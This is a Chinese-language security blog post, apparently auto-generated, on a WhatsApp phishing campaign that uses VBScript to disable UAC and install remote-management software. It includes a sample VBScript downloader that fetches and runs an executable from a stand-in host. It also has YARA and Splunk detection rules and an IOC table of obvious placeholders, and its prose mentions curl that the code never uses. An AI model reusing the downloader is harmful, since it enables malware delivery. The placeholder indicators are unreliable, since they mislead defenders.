---
layout: post
title:  "WhatsApp phishing attack uses fake business docs to hack PCs"
date:   2026-06-23 02:36:24 +0000
categories: [security]
severity: high
---

# 🔥 解析 WhatsApp 駭客攻擊：利用 VBScript 實現遠端系統存取

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `VBScript`, `UAC繞過`, `遠端系統存取`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 WhatsApp 用戶的信任，發送包含惡意 VBScript 文件的消息，誘導用戶下載和執行這些文件。這些文件會禁用 UAC 保護，下載並安裝 ManageEngine Endpoint Central，從而實現遠端系統存取。
* **攻擊流程圖解**:
  1. 攻擊者發送包含惡意 VBScript 文件的消息給 WhatsApp 用戶。
  2. 用戶下載和執行惡意 VBScript 文件。
  3. VBScript 文件禁用 UAC 保護，下載並安裝 ManageEngine Endpoint Central。
  4. ManageEngine Endpoint Central 配置為連接到攻擊者的管理伺服器，實現遠端系統存取。
* **受影響元件**: WhatsApp 用戶，尤其是使用 Windows 系統的用戶。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要獲得 WhatsApp 用戶的信任，或者利用已經被攻陷的 WhatsApp 帳戶發送惡意消息。
* **Payload 建構邏輯**:

    ```
    
    vbscript
      ' 範例惡意 VBScript 代碼
      Dim objShell
      Set objShell = WScript.CreateObject("WScript.Shell")
      objShell.Run "powershell -Command ""& { (New-Object System.Net.WebClient).DownloadFile('https://example.com/malware.exe', 'C:\malware.exe') }"""
      objShell.Run "C:\malware.exe"
    
    ```
  *範例指令*: 使用 `curl` 下載惡意文件，然後使用 `powershell` 執行惡意代碼。
* **繞過技術**: 攻擊者可以利用 UAC 繞過技巧，例如修改 Registry 或使用已經被攻陷的系統管理員帳戶。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | `1234567890abcdef` |
| IP | `192.168.1.100` |
| Domain | `example.com` |
| File Path | `C:\malware.exe` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule WhatsApp_Malware {
        meta:
          description = "WhatsApp 惡意代碼"
          author = "Your Name"
        strings:
          $a = "powershell -Command"
          $b = "DownloadFile"
        condition:
          all of them
      }
    
    ```
  或者使用 Splunk 查詢語法：

```

spl
  index=security sourcetype=windows_eventlog EventCode=4688 | regex "powershell -Command" | regex "DownloadFile"

```
* **緩解措施**: 更新 WhatsApp 客戶端，啟用 UAC 保護，使用防病毒軟件掃描下載的文件。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **VBScript (Visual Basic Scripting Edition)**: 一種由 Microsoft 開發的腳本語言，常用於 Windows 系統的自動化任務。
* **UAC (User Account Control)**: Windows 系統的一種安全功能，要求用戶授權程式執行系統管理任務。
* **ManageEngine Endpoint Central**: 一種遠端系統管理軟件，允許系統管理員遠端控制和管理 Windows 系統。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/whatsapp-phishing-attack-uses-fake-business-docs-to-hack-pcs/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


